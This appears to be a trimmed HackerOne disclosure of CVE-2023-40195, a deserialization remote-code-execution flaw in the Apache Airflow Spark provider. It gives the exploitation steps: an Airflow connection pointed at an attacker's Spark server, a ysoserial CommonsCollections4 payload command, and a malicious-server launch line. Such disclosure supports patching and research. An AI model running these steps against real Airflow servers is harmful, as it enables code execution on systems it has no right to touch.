# [M] CVE-2023-40195: Apache Airflow Spark Provider Deserialization Vulnerability RCE

## Summary
Severity: Medium
Program: Internet Bug Bounty
Weakness: Deserialization of Untrusted Data
Reporter: x_h1
State: resolved
Disclosed: 2023-09-08T13:06:25.448Z
CVE: CVE-2023-40195
Source: https://hackerone.com/reports/2127968

## Details
Apache Airflow Spark Provider. After the malicious Spark server address is configured through the connections of the Airflow UI interface, attackers exploit malicious servers to manipulate pyspark clients through malicious deserialization data. So as to implement RCE attack on airflow server.

##Vulnerability principle：

1. Analyze spark principle: Spark protocol is based on RPC communication. The RPC communication process is a serialization and deserialization process, Therefore, attackers can call arbitrary java methods through deserialization, implement RCE.

2.Spark can attack the server through malicious client deserialization, and can also attack the client through malicious server; In the Airflow scenario, PySpark is used as a client to connect to the Spark Server through Spark Provider. So, an attacker only needs to construct a malicious server to attack Airflow's Spark client.

The command that triggers deserialization is as follows:
**spark-submit --master spark://evil_ip:port**
Therefore, an attacker can configure malicious ip and port through the connections of the Airflow UI. And to execute the above command, then trigger the deserialization operation.

##Vulnerability exploitation process：

1. Create a new ‘Spark’ connection is named ‘spark_default’，and configure the Port and Host parameter.
Host: spark://172.31.76.174
Port: 8888

###172.31.76.174 is malicious spark server address for attackers


(F2648714)

{F2648715}

2.Attackers generate malicious deserialized data (exp.der) through the deserialization tool ysoserial. 
**Tool URL: https://github.com/frohoff/ysoserial**
The attacker locally executes the following commands：
**"C:\Program Files\Java\jre1.8.0_361\bin\java" -jar ysoserial.jar CommonsCollections4 "touch /tmp/thisisRCE" > exp.der**
#touch /tmp/thisisRCE is malicious commands to be executed on airflow.

{F2648716}

3.The attacker starts the malicious Spark server locally and specifies the malicious deserialized data to be transmitted.
**python2 evil_spark_server.py 8888 exp.der**

{F2648717}


_Trimmed to 38 lines — full report: https://hackerone.com/reports/2127968_
